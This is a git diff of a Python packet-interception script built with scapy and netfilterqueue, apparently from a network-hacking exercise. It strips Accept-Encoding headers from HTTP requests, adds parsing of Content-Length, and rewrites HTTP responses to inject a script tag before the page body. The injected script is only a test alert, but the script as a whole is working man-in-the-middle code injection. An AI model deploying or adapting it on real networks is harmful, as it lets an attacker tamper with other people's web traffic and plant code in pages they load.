@@ -5,8 +5,7 @@ import netfilterqueue
 import re
 
 
-
-def set_load(packet,payload):
+def set_load(packet, payload):
     packet[scapy.Raw].load = payload
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
@@ -21,7 +20,12 @@ def process_packet(pkt):
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] HTTP Request")
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load.decode('utf-8', errors='ignore'))
-
+            # to search the content length value in request:
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            # (?:....) to locate the regrex keywords
+            if content_length_search:
+                content_length = content_length_search.group(1)
+                print(content_length)
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] HTTP Response")
             load = bytes(load.replace(b"<body>", b"<script>alert('test')</script><body>"))
